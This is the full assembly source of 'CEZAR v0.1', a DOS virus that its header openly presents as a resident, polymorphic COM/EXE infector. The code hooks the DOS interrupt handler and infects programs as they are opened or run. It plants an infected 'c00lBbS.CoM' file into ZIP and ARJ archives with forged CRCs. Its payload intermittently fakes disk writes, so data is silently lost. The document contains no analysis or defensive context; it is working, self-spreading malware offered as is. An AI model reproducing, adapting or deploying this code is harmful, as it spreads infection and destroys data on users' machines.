comment $

                                 CEZAR v0.1

                                     by

                               Wild W0rker /RSA.

  - Parasitic resident COM/EXE infector
  - Uses original int 21 handler
  - Polymorphic (Use WWPE v0.01, by Wild W0rker /RSA:)
  - Work correctly with DOS 7.0 COM files.
  - Work correctly with PKZIP (No CRC Error)
  - Add infected c00lBbS.CoM to ZIP and ARJ archives.
  - Sometime didn't make write with AH=40h/INT 21h.:)

$

jumps
.model  tiny
.code
virlenpara      equ     400h
viruslen        equ     offset wwpe_end - offset start + 1

start:
                call    $+3
                mov     bp,sp
                mov     bp,word ptr ss:[bp]
                sub     bp,3
                call    eflag
                mov     word ptr cs:[savees+bp],es
                mov     ah,30h
                mov     bx,'ww'
                int     21h
                cmp     bx,'WW'
                je      allready_installed

                call    allocate_memory
                jc      allready_installed

                sub     word ptr ds:[2],virlenpara+1

                push    cs
                lea     ax,allready_installed
                add     ax,bp
                push    ax

                push    es cs
                pop     ds
                mov     si,bp
                mov     cx,viruslen
                cld
                rep     movsb
                lea     ax,inhigh
                push    ax
                retf

eflag:
                ret     2

savees          dw      0

allready_installed:
                cmp     byte ptr cs:[bp+filetype],1
                je      return2exe
                push    ss ss
                pop     ds
                mov     di,100h
                push    di ss
                pop     es
                mov     ax,word ptr ds:[bp+oldbytes]
                stosw
                mov     al,byte ptr ds:[bp+oldbytes+2]
                stosb
                xor     bp,bp
                call    dummy
                retf


return2exe:
                mov     bx,word ptr cs:[savees+bp]
                mov     ds,bx
                mov     es,bx
                add     bx,10h
                add     word ptr cs:[bp+oldbytes+16h],bx
                add     word ptr cs:[bp+oldbytes+0eh],bx
                call    dummy
                cli
                mov     ss,word ptr cs:[bp+oldbytes+0eh]
                mov     sp,word ptr cs:[bp+oldbytes+10h]
                sti
                jmp     dword ptr cs:[bp+oldbytes+14h]


dummy:
                ret


allocate_memory:
                xor     di,di
                lea     ax,[di+5200h]
                int     21h
                mov     ax,word ptr es:[bx-2]

findagain:
                mov     es,ax
                cmp     byte ptr es:[di],5ah
                jne     calc_new_mcb
                cmp     word ptr es:[di+3],virlenpara+1
                jb      allocate_fail
                jmp     short find

calc_new_mcb:
                add     ax,word ptr es:[di+3]
                inc     ax
                jmp     short findagain

allocate_fail:
                stc
                ret

find:
                sub     word ptr es:[di+3],virlenpara+1
                mov     byte ptr es:[di],4dh
                add     ax,word ptr es:[di+3]
                inc     ax
                mov     es,ax
                mov     byte ptr es:[di],5ah
                mov     word ptr es:[di+1],8
                mov     word ptr es:[di+3],virlenpara
                inc     ax
                mov     es,ax
                clc
                ret


inhigh:
                mov     di,word ptr cs:[savees]
                mov     es,di

                call    trace

                mov     di,8
                mov     es,di
                shr     di,1
                lds     dx,dword ptr es:[di]
                mov     word ptr cs:[v21],dx
                mov     word ptr cs:[v21+2],ds
                lea     ax,ent21
                cld
                stosw
                push    cs
                pop     ax
                stosw
                retf


trace:
                les     bx,dword ptr es:[6]
trace_next:
                cmp     byte ptr es:[bx],0eah
                jnz     check_dispatch
                les     bx,dword ptr es:[bx+1]
                cmp     word ptr es:[bx],9090h
                jnz     trace_next
                sub     bx,32h

                cmp     word ptr es:[bx],9090h
                jnz     check_dispatch
good_search:
                mov     word ptr cs:[v21org],bx
                mov     word ptr cs:[v21org+2],es
                ret

check_dispatch:
                cmp     word ptr es:[bx],2e1eh
                jnz     bad_exit
                add     bx,25h
                cmp     word ptr es:[bx],80fah
                jz      good_search
bad_exit:
                mov     bx,8
                mov     es,bx
                shr     bx,1
                les     bx,dword ptr es:[bx]
                jmp     good_search


dos:
                pushf
                db      9ah
v21org          dw      0,0
                ret


chkmy:
                cmp     bx,'ww'
                jne     exit_int21
                call    popall
                mov     bx,'WW'


exit_after_call:
                pushf
                call    res24
                popf
                retf    2


ent21:
                call    pushall
                call    set24

                push    ax
                lea     si,int_tab
check_func:
                lods    byte ptr cs:[si]
                or      al,al
                jne     not_end
                pop     ax
                jmp     exit_int21
not_end:
                cmp     al,ah
                je      call_func
                add     si,2
                jmp     short check_func

call_func:
                pop     ax
                jmp     word ptr cs:[si]

                              
exit_int21:
                call    res24
                call    popall
                db      0eah
v21             dw      0,0


infect_on_4b:
                or      al,al
                jne     exit_int21


infect:
                mov     word ptr cs:[fname],dx
                mov     word ptr cs:[fname+2],ds
                mov     di,dx
                push    ds
                pop     es
                mov     cx,128
                cld
                mov     al,0
                repne   scasb
                jne     badextension

                mov     si,di
                sub     si,4
                lodsw
                or      ax,2020h
                not     ax
                cmp     ax,not 'oc'
                jne     check_exe
                lodsb
                or      al,20h
                cmp     al,'m'
                jne     badextension
                mov     byte ptr cs:[filetype],0
                jmp     goodextension
check_exe:
                cmp     ax,not 'xe'
                jne     check_arj
                lodsb
                or      al,20h
                cmp     al,'e'
                jne     badextension
                mov     byte ptr cs:[filetype],1
                jmp     goodextension

check_arj:
                cmp     ax,not 'ra'
                jne     check_zip
                lodsb
                or      al,20h
                cmp     al,'j'
                jne     badextension
                mov     byte ptr cs:[arctype],0 ; 0 - arj, 1 - zip
                jmp     arcinfect

check_zip:
                cmp     ax,not 'iz'
                jne     badextension
                lodsb
                or      al,20h
                cmp     al,'p'
                jne     badextension
                mov     byte ptr cs:[arctype],1
                jmp     arcinfect

badextension:
                jmp     exit_int21

goodextension:
                call    getattr
                jnc     getattrok
                jmp     infect_error_01
getattrok:
                mov     word ptr cs:[attr],cx
                xor     cx,cx
                call    setattr
                jc      infect_error_01
                call    openfile
                jc      infect_error_02

                push    cs
                pop     ds

                mov     word ptr ds:[handle],bx

                call    gettime
                mov     word ptr ds:[ftime],cx
                mov     word ptr ds:[fdate],dx

                and     cx,13h
                cmp     cx,13h
                je      infect_error_03

                cmp     byte ptr ds:[demo_start],1
                je      skip_pkzip_check

                call    check_pkzip             ; if pkzip open files
                jc      infect_error_03         ; don't infect them

skip_pkzip_check:
                mov     cx,1ch
                lea     dx,buffer
                call    read
                jc      infect_error_03

                push    ds
                pop     es
                lea     di,oldbytes
                mov     si,dx
                mov     cx,18h
                cld
                rep     movsb

                mov     bx,word ptr ds:[handle]
                call    seekend

                mov     bl,byte ptr ds:[filetype]
                shl     bl,1
                xor     bh,bh
                jmp     word ptr ds:[infproc+bx]


infect_error_04:
                mov     cx,word ptr ds:[ftime]
                mov     bx,word ptr ds:[handle]
                mov     dx,word ptr ds:[fdate]
                call    settime

infect_error_03:
                mov     bx,word ptr ds:[handle]
                call    closefile

infect_error_02:
                mov     cx,word ptr cs:[attr]
                lds     dx,dword ptr cs:[fname]
                call    setattr
infect_error_01:
                jmp     badextension


cominf:
                mov     si,word ptr ds:[buffer]
                not     si
                cmp     si,not 'ZM'
                je      cominf_error
                cmp     dx,0
                jne     cominf_error
                cmp     ax,200
                jb      cominf_error
                cmp     ax,60000
                ja      cominf_error

                mov     byte ptr ds:[buffer],0e9h
                sub     ax,3
                mov     word ptr ds:[buffer+1],ax
                mov     bp,103h
                add     bp,ax

                mov     dx,-7                   ; read last 7 bytes, for ENUNS
                mov     cx,-1                   ; check
                mov     bx,word ptr ds:[handle]
                mov     ax,4202h
                call    dos

                mov     cx,7
                lea     dx,last7
                call    read

                call    writebody
                jc      cominf_error

                cmp     word ptr ds:[last7+3],'SN'
                jne     write_header

                add     ax,7
                add     word ptr ds:[last7+5],ax

                lea     dx,last7
                mov     cx,7
                mov     bx,word ptr ds:[handle]
                call    write

write_header:
                mov     bx,word ptr ds:[handle]
                call    seekstart

                lea     dx,buffer
                mov     cx,18h
                call    write
                jc      cominf_error

                mov     cx,word ptr ds:[ftime]
                mov     dx,word ptr ds:[fdate]
                or      cx,13h
                call    settime

                jmp     infect_error_03

cominf_error:
                jmp     infect_error_04


overlay_present:
                pop     dx ax
                jmp     short cominf_error


exeinf:
                cmp     word ptr ds:[buffer+0ch],-1
                jne     cominf_error

                cmp     word ptr ds:[buffer+1ah],0
                jne     cominf_error

                cmp     word ptr ds:[buffer+18h],40h
                jae     cominf_error

                push    ax dx

                mov     cx,200h
                div     cx
                or      dx,dx
                jz      $+3
                inc     ax

                cmp     dx,word ptr ds:[buffer+2]
                jne     overlay_present
                cmp     ax,word ptr ds:[buffer+4]
                jne     overlay_present

                pop     dx ax

                mov     bx,10h
                div     bx

                mov     bp,dx

                sub     ax,word ptr ds:[buffer+8]

                mov     word ptr ds:[buffer+16h],ax
                mov     word ptr ds:[buffer+14h],dx

                add     dx,viruslen + 6000h
                and     dx,1111111111111110b

                mov     word ptr ds:[buffer+0eh],ax
                mov     word ptr ds:[buffer+10h],dx

                call    writebody
                jc      cominf_error

                mov     bx,word ptr ds:[handle]
                call    seekend

                mov     bx,200h
                div     bx
                or      dx,dx
                jz      $+3
                inc     ax

                mov     word ptr ds:[buffer+4],ax
                mov     word ptr ds:[buffer+2],dx

                jmp     write_header


writebody:
                push    cs
                pop     ds
                xor     si,si           ; code to crypt
                mov     cx,viruslen
		push	cs
		pop	es
		lea	di,wwpe_end+2000

                mov     ax,255
                call    rnd
                xchg    al,ah
                mov     al,6
                cmp     ah,127
                jb      call_engine
                or      al,1
call_engine:
                call    wwpe

                lea	dx,wwpe_end+2000
                mov     bx,word ptr cs:[handle]
                call    write
                ret


infproc         dw      offset cominf
                dw      offset exeinf

arcinfect:
                call    getattr                         ; get arc attr
                jc      arc_error_1
                mov     word ptr cs:[arcattr],cx
                xor     cx,cx
                call    setattr                         ; set arc attr
                jc      arc_error_1
                mov     word ptr cs:[arcname],dx        ; save file name
                mov     word ptr cs:[arcname+2],ds
                call    openfile                        ; open archive
                jc      arc_error_2                     ; (restore attr)

                push    cs
                pop     ds

                mov     word ptr ds:[archandle],bx

                call    gettime
                mov     word ptr ds:[arctime],cx
                mov     word ptr ds:[arcdate],dx

                cmp     byte ptr ds:[arctype], 1        ; zip ?
                jne     arjinf
                jmp     zipinf

; ARJ Infection

arjinf:
                lea     dx,wwpe_end
                mov     cx,size ArjArcHeader
                call    read                            ; read main header

		mov	di,dx
                cmp     word ptr ds:[di.A_Sig],0ea60h     ; correct arj?
                jne     arc_error_4
                cmp     byte ptr ds:[di.A_FileType],2
                jne     arc_error_4

                call    getcomment                      ; read arcname & comment

		inc	dx
		mov	cx,4
                call    read                            ; read crc
		add	dx,ax
		mov	cx,2
                call    read                            ; read extra
		mov	di,dx
                cmp     word ptr ds:[di],0              ; non zero?
                jne     arc_error_4                     ; damn, not our file:)

; Here we find our demo in arj file

nextfile:
                lea     dx,wwpe_end
		mov	di,dx
                mov     cx,size ArjFileHead
		call	read

                cmp     word ptr ds:[di.F_Sig],0ea60h   ; correct file
                jne     arc_error_4

                cmp     word ptr ds:[di.F_BHSize],0     ; last file header?
                je      add_demo                        ; if so, add our demo

                call    getcomment                      ; read filename & comment

                inc     dx

                mov     cx,4                            ; read crc
		call	read

                add     dx,ax                           ; read extra field
		mov	cx,2
		call	read

		xor	bp,bp
                lea     si,wwpe_end
                add     si,size ArjFileHead             ; point to filename
checkdemo:
                mov     ah,byte ptr ds:[demoname+bp]
		inc	bp
		lodsb
                cmp     ah,0
		jne	checknextbyte
                jmp     arc_error_4                     ; demo in archive
checknextbyte:
		cmp	al,ah
		je	checkdemo

                mov     ax,4201h                        ; goto to next file
                les     dx,dword ptr ds:[di.F_CompSize]
		mov	cx,es
		call	dos

		jmp	nextfile

; Here we add our demo to the arj

add_demo:
                lea     dx,demoname                     ; create demo file
                call    createfile
                jc      arc_error_4

                lea     dx,democode                     ; write demo file code
                mov     cx,democode_size
                call    write

                call    closefile

                mov     byte ptr ds:[demo_start],1

                lea     dx,demoname
                mov     ax,3d02h
                int     21h                             ; after that, demo file
                mov     byte ptr ds:[demo_start],0
                jc      arc_error_4                     ; will be infected

                xchg    ax,bx
                mov     word ptr ds:[demohandle],bx

                call    seekend

                mov     word ptr ds:[demosize],ax       ; save demo size
		mov	word ptr ds:[demosize+2],dx

                call    seekstart

                lea     bp,wwpe_end                     ; where gen table
                call    c_crc32

                mov     bx,word ptr ds:[archandle]
                call    seekend

		sub	ax,4
		sbb	dx,0
		mov	cx,dx
		mov	dx,ax
                call    seek

; make our file header

                lea     di,wwpe_end

		mov	word ptr ds:[di.F_Sig],0ea60h
                mov     word ptr ds:[di.F_BHSize], F_HostData - F_HSize1 + demolen + 1 + 2
                mov     byte ptr ds:[di.F_HSize1], F_HostData - F_HSize1 + 2
		mov	byte ptr ds:[di.F_Version],6
		mov	byte ptr ds:[di.F_MinVersion],1
		xor	ax,ax
		mov	byte ptr ds:[di.F_OS],al
		mov	byte ptr ds:[di.F_Flags],al
		mov	byte ptr ds:[di.F_Method],al
		mov	byte ptr ds:[di.F_FileType],al
		mov	byte ptr ds:[di.F_Res],al
                mov     word ptr ds:[di.F_ModDate],demotime
                mov     word ptr ds:[di.F_ModDate+2],demodate
		les	dx,dword ptr ds:[demosize]
		mov	ax,es
		mov	word ptr ds:[di.F_CompSize],dx
		mov	word ptr ds:[di.F_CompSize+2],ax
		mov	word ptr ds:[di.F_OrgSize],dx
		mov	word ptr ds:[di.F_OrgSize+2],ax
                les     dx,dword ptr ds:[crc]
		mov	word ptr ds:[di.F_Crc32],dx
		mov	word ptr ds:[di.F_Crc32+2],es
		mov	word ptr ds:[di.F_FileSpecPos],0
                mov     word ptr ds:[di.F_FAccessMode],0
		mov	word ptr ds:[di.F_HostData],0

                push    cs
                pop     es

                add     di,size ArjFileHead             ; store demo name
		lea	si,demoname
                mov     cx,demolen
		cld
		rep	movsb

                xor     al,al                           ; no comment
		stosb

                push    di

                lea     bp,wwpe_end+100                     ; generate table
                call    gentable

                pop     di

                mov     word ptr ds:[crc],0ffffh        ; init crc
                mov     word ptr ds:[crc+2],0ffffh

                lea     si,wwpe_end
                mov     cx,word ptr ds:[si.F_BHSize]
                add     si,4

                call    calc_crc32

                mov     ax,word ptr ds:[crc]            ; store crc
                not     ax
                stosw
                mov     ax,word ptr ds:[crc+2]
                not     ax
                stosw
                xor     ax,ax                           ; store extra
                stosw

                mov     bx,word ptr ds:[archandle]      ; write demo header
                mov     cx,di
                sub     cx,offset wwpe_end
                lea     dx,wwpe_end
                call    write

                mov     bx,word ptr ds:[demohandle]
                call    seekstart

storedemo:
                mov     bx,word ptr ds:[demohandle]
                mov     cx,100h
                lea     dx,wwpe_end
                call    read
                xchg    cx,ax
                or      cx,cx
                je      demostored
                mov     bx,word ptr ds:[archandle]
                call    write
                jmp     short storedemo
demostored:

                call    closefile                       ; close demo
                lea     dx,demoname
                call    deletefile                      ; delete demo

                mov     cx,4                            ; write sign
                lea     dx,sign
                mov     bx,word ptr ds:[archandle]
                call    write

arc_error_4:
                mov     bx,word ptr ds:[archandle]      ; restore arc time/date
                mov     cx,word ptr ds:[arctime]
                mov     dx,word ptr ds:[arcdate]
                call    settime

arc_error_3:
                call    closefile                       ; close archive

arc_error_2:
                mov     cx,word ptr cs:[arcattr]        ; restore arc attribs
                lds     dx,dword ptr cs:[arcname]
                call    setattr

arc_error_1:
                jmp     badextension


; ZIP Infection

zipinf:
                lea     di,wwpe_end

read_next_record:

                mov     cx,4
                mov     dx,di
                call    read

                cmp     word ptr ds:[di],'KP'
                je      zipsign_ok
                jmp     arc_error_4            ; restore time
zipsign_ok:
                cmp     word ptr ds:[di+2],0201h
                jne     find_demo
                jmp     dir_record

find_demo:
                add     dx,4
                mov     cx,1ah
                call    read
                mov     cx,word ptr ds:[di.fname_len]
                add     dx,ax
                call    read
                mov     si,dx
                xor     bx,bx
check_demo:
                lodsb
                mov     ah,byte ptr ds:[demoname+bx]
                inc     bx
                cmp     ah,0
                jne     chknextbyte
                jmp     arc_error_4

chknextbyte:
                cmp     al,ah
                je      check_demo
                mov     dx,word ptr ds:[di.compsize]
                mov     cx,word ptr ds:[di.compsize+2]
                mov     ax,word ptr ds:[di.extra_len]
                add     dx,ax
                adc     cx,0
                mov     bx,word ptr ds:[archandle]
                call    cur_seek
                jmp     read_next_record

dir_record:

                lea     dx,tempname
                call    createfile
                jnc     temp_create_ok
                jmp     arc_error_4

temp_create_ok:
                mov     word ptr ds:[temphandle],bx

                mov     word ptr ds:[dir_counter],0

savedir:
                inc     word ptr ds:[dir_counter]
                mov     dx,di
                add     dx,4
                mov     cx,2ah
                mov     bx,word ptr ds:[archandle]
                call    read
                mov     cx,ax
                add     cx,4
                mov     dx,di
                mov     bx,word ptr ds:[temphandle]
                call    write
                add     dx,ax
                mov     cx,word ptr ds:[di.dir_fname_len]
                add     cx,word ptr ds:[di.dir_extra_len]
                add     cx,word ptr ds:[di.dir_coment_len]
                mov     bx,word ptr ds:[archandle]
                call    read
                mov     cx,ax
                mov     bx,word ptr ds:[temphandle]
                call    write
                mov     dx,di
                mov     cx,4
                mov     bx,word ptr ds:[archandle]
                call    read
                cmp     word ptr ds:[di],'KP'
                je      zipsign_ok1
                jmp     zip_error_04                    ; del temp
zipsign_ok1:
                cmp     word ptr ds:[di+2],0605h
                jne     savedir

                add     dx,4
                mov     cx,12h
                call    read
                mov     cx,ax
                add     cx,4
                mov     ax,word ptr ds:[di.edir_sdn]
                mov     word ptr ds:[sdn],ax
                mov     ax,word ptr ds:[di.edir_sdn+2]
                mov     word ptr ds:[sdn+2],ax
                mov     dx,di
                mov     bx,word ptr ds:[temphandle]
                call    write
                add     dx,ax
                mov     cx,word ptr ds:[di.edir_coment_len]
                mov     bx,word ptr ds:[archandle]
                call    read
                mov     cx,ax
                mov     bx,word ptr ds:[temphandle]
                call    write

                lea     dx,demoname
                call    createfile
                jnc     demo_create_ok
                jmp     zip_error_04
demo_create_ok:
                lea     dx,democode
                mov     cx,democode_size
                call    write

                call    closefile

                mov     byte ptr ds:[demo_start],1

                mov     ax,3d02h
                lea     dx,demoname
                int     21h                     ; after that file will be infected

                mov     byte ptr ds:[demo_start],0

                mov     word ptr ds:[demohandle],ax

                xchg    ax,bx
                call    seekend

                mov     word ptr ds:[demosize],ax
                mov     word ptr ds:[demosize+2],dx

                call    seekstart

                lea     bp,wwpe_end
                call    c_crc32

                mov     bx,word ptr ds:[archandle]
                mov     dx,word ptr ds:[sdn]
                mov     cx,word ptr ds:[sdn+2]
                call    seek

                mov     word ptr ds:[di.pksign],'KP'
                mov     word ptr ds:[di.lfsign],0403h
                mov     word ptr ds:[di.ver],10
                xor     ax,ax
                mov     word ptr ds:[di.bitflag],ax
                mov     word ptr ds:[di.comp_method],ax
                mov     word ptr ds:[di.modtime],demotime
                mov     word ptr ds:[di.moddate],demodate
                les     ax,dword ptr ds:[crc]
                mov     word ptr ds:[di.crc32],ax
                mov     word ptr ds:[di.crc32+2],es
                les     ax,dword ptr ds:[demosize]
                mov     word ptr ds:[di.compsize],ax
                mov     word ptr ds:[di.compsize+2],es
                mov     word ptr ds:[di.uncompsize],ax
                mov     word ptr ds:[di.uncompsize+2],es
                mov     word ptr ds:[di.fname_len],demolen-1
                mov     word ptr ds:[di.extra_len],0
                mov     cx,1eh
                mov     dx,di
                call    write
                lea     dx,demoname
                mov     cx,demolen-1    ; with out zero
                call    write
                mov     bx,word ptr ds:[demohandle]
                call    seekstart
add2zip:
                mov     cx,200h
                mov     bx,word ptr ds:[demohandle]
                mov     dx,di
                call    read
                xchg    cx,ax
                or      cx,cx
                jz      demo_added
                mov     bx,word ptr ds:[archandle]
                call    write
                jmp     short add2zip
demo_added:
                mov     bx,word ptr ds:[temphandle]
                call    seekstart

next_dir_record:
                cmp     word ptr ds:[dir_counter],0
                je      make_our_dir_record

                ;restore dir from temp

                dec     word ptr ds:[dir_counter]

                mov     dx,di
                mov     cx,2eh
                mov     bx,word ptr ds:[temphandle]
                call    read

                mov     cx,word ptr ds:[di.dir_fname_len]
                add     cx,word ptr ds:[di.dir_extra_len]
                add     cx,word ptr ds:[di.dir_coment_len]
                add     dx,2eh
                call    read
                mov     cx,ax
                add     cx,2eh
                mov     bx,word ptr ds:[archandle]
                mov     dx,di
                call    write
                jmp     next_dir_record

make_our_dir_record:
                mov     ax,10
                mov     word ptr ds:[di.dir_version],ax
                mov     word ptr ds:[di.dir_vex],ax
                xor     ax,ax
                mov     word ptr ds:[di.dir_bitflag],ax
                mov     word ptr ds:[di.dir_comp_method],ax
                mov     word ptr ds:[di.dir_modtime],demotime
                mov     word ptr ds:[di.dir_moddate],demodate
                les     ax,dword ptr ds:[crc]
                mov     word ptr ds:[di.dir_crc32],ax
                mov     word ptr ds:[di.dir_crc32+2],es
                les     ax,dword ptr ds:[demosize]
                mov     word ptr ds:[di.dir_compsize],ax
                mov     word ptr ds:[di.dir_compsize+2],es
                mov     word ptr ds:[di.dir_uncompsize],ax
                mov     word ptr ds:[di.dir_uncompsize+2],es
                mov     word ptr ds:[di.dir_fname_len],demolen-1
                xor     ax,ax
                mov     word ptr ds:[di.dir_extra_len],ax
                mov     word ptr ds:[di.dir_coment_len],ax
                mov     word ptr ds:[di.dir_dns],ax
                mov     word ptr ds:[di.dir_ifa],ax
                mov     word ptr ds:[di.dir_efa],ax
                mov     word ptr ds:[di.dir_efa+2],ax
                les     ax,dword ptr ds:[sdn]
                mov     word ptr ds:[di.dir_rolf],ax
                mov     word ptr ds:[di.dir_rolf+2],es
                mov     bx,word ptr ds:[archandle]
                mov     cx,2eh
                mov     dx,di
                call    write
                lea     dx,demoname
                mov     cx,demolen-1
                call    write

                mov     cx,16h
                mov     dx,di
                mov     bx,word ptr ds:[temphandle]
                call    read
                mov     cx,word ptr ds:[di.edir_coment_len]
                add     dx,ax
                call    read
                mov     cx,ax
                add     cx,16h

                inc     word ptr ds:[di.edir_cdod]
                inc     word ptr ds:[di.edir_cd]
                add     word ptr ds:[di.edir_size_cd],mydirlen
                adc     word ptr ds:[di.edir_size_cd+2],0

                les     ax,dword ptr ds:[di.edir_sdn]
                mov     dx,es
                add     ax,29h          ; our local header + our filename len
                adc     dx,0
                add     dx,word ptr ds:[demosize+2]
                add     ax,word ptr ds:[demosize]
                adc     dx,0
                mov     word ptr ds:[di.edir_sdn],ax
                mov     word ptr ds:[di.edir_sdn+2],dx
                mov     bx,word ptr ds:[archandle]
                mov     dx,di
                call    write

                mov     bx,word ptr ds:[demohandle]
                call    closefile
                lea     dx,demoname
                call    deletefile

zip_error_04:
                mov     bx,word ptr ds:[temphandle]
                call    closefile
                lea     dx,tempname
                call    deletefile

                jmp     arc_error_4


;*************************************************
demoname        db      'c00lBbS.CoM',0
demolen         equ     $-demoname
demohandle      dw      0
demosize        dw      0,0
demodate        equ     2621h
demotime        equ     13h
demo_start      db      0

archandle       dw      0
arcname         dw      0,0
arctime         dw      0
arcdate         dw      0
arcattr         dw      0

zeros           db      0
sign            dw      0ea60h,0

arctype         db      0

temphandle      dw      0
dir_counter     dw      0
sdn             dw      0,0
crc             dw      0,0
mydirlen        equ     2eh+demolen-1
tempname        db      '$$temp$$',0

;*************************************************
democode:
dd 0A12ECB8Ch,0D8290002h,0731FF13Dh,08020CD02h,0DB8E10C7h,0FF0006C7h,0C38E6648h,0FF33C033h
dd 0F37D00B9h,0A000B8ABh,013B8C08Eh,0BA10CD00h,000B003C8h,000B142EEh,0C0EEC888h,0B0EE02E8h
dd 08041EE00h,0F07240F9h,03FB000B1h,0D0C888EEh,0EE1004E8h,041EE00B0h,07240F980h,0B000B1EDh
dd 0C888EE3Fh,00402E8C0h,0C888EE30h,0F98041EEh,0B9EC7240h,03FB000C0h,0BFFDE2EEh,000A1FB40h
dd 002C0D0FFh,02ACCD0C4h,0FF00A3E0h,085890589h,0C7830140h,080FF8102h,0E8E372FCh,001B4002Ch
dd 0D77416CDh,016CD00B4h,0E86064B2h,00661001Ch,0C08ED88Ch,000B9C28Ah,0FA00BF05h,0FE07AAF3h
dd 0B8E775CAh,010CD0003h,080BE20CDh,0B7C03302h,0FF440200h,0FC100402h,010014402h,0408402FCh
dd 0C1FC1001h,0017402E8h,080848848h,0FE8146FDh,0D972FDC0h,0FF33F633h,0663DE0B9h
db 0F3h,0A5h,0C3h
democode_size   equ     $-democode
;*************************************************

buffer          dw      1ch / 2 dup (20cdh)
oldbytes        dw      18h / 2 dup (20cdh)
fname           dw      0,0
ftime           dw      0
fdate           dw      0
handle          dw      0
filetype        db      0
attr            dw      0

pushall:
                pop     word ptr cs:[tmp]
                push    ax bx cx dx si di es ds bp
                jmp     word ptr cs:[tmp]

popall:
                pop     word ptr cs:[tmp]
                pop     bp ds es di si dx cx bx ax
                jmp     word ptr cs:[tmp]


int_tab         db      30h
                dw      offset chkmy
                db      3dh
                dw      offset infect
                db      4bh
                dw      offset infect_on_4b
                db      43h
                dw      offset infect
                db      40h
                dw      offset payload
                db      0


set24:
                push    bx es ds
                xor     bx,bx
                mov     es,bx
                lds     bx,dword ptr es:[24h*4]
                mov     word ptr cs:[v24],bx
                mov     word ptr cs:[v24+2],ds
                mov     word ptr es:[24h*4],offset ent24
                mov     word ptr es:[24h*4+2],cs
                pop     ds es bx
                ret

res24:
                push    es bx ds
                xor     bx,bx
                mov     es,bx
                lds     bx,dword ptr cs:[v24]
                mov     word ptr es:[24h*4],bx
                mov     word ptr es:[24h*4+2],ds
                pop     ds bx es
                ret

ent24:
                mov     al,3
                iret

v24             dw      0,0

payload:
                xor     ax,ax
                mov     es,ax
                cmp     word ptr es:[46ch],13h
                je      do_my_write
                jmp     exit_int21
do_my_write:
                call    popall
                mov     ax,cx
                clc
                jmp     exit_after_call


check_pkzip:
                push    ax bx cx es di
                mov     ah,62h
                call    dos
                mov     es,bx
                mov     bx,word ptr es:[2ch]
                mov     es,bx
                xor     di,di
                mov     al,0
                mov     cx,0ffffh
                cld
check_more:
                repne   scasb
                cmp     byte ptr es:[di],0
                jne     check_more
                add     di,3
                mov     al,0
                cld
                repne   scasb
                sub     di,7
                mov     ax,word ptr es:[di]
                or      ax,2020h
                cmp     ax,'pi'
                jne     nope
                stc
ret_pkzip:
                pop     di es cx bx ax
                ret
nope:
                clc
                jmp     short ret_pkzip

getcomment:
		mov	byte ptr ds:[zeros],0
next_byte:
		add	dx,ax
		mov	cx,1
		call	read
                mov     si,dx
                cmp     byte ptr ds:[si],0
		jne	next_byte
		inc	byte ptr ds:[zeros]
		cmp	byte ptr ds:[zeros],2
		jne	next_byte
		ret

tmp             dw      'WW'

last7           db      7 dup (90h)

include         strucs.asm
include         crc32.asm
include         procs.asm

extrn           wwpe:near
extrn           wwpe_end:near
extrn           rnd:near

                end     start
